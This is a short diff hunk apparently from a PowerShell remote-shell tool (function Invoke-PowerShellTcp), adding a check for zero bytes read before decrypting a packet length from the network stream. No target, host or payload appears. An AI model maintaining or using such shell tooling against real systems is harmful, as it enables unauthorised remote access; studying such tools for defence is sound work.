@@ -157,7 +157,10 @@ function Invoke-PowerShellTcp
         param (
             [Parameter(Position = 0)] $Stream
         )
-        $stream.Read($bytes, 0, 4)
+        $bytes_read = $stream.Read($bytes, 0, 4)
+        if ($bytes_read -eq 0) {
+            return $($Null, $Null)
+        }
         $enc_packet_length = $bytes[0..3]
         $packet_length = Decrypt-Code $enc_packet_length $KEY
         $len = [BitConverter]::ToUInt32([byte[]]$packet_length, 0)
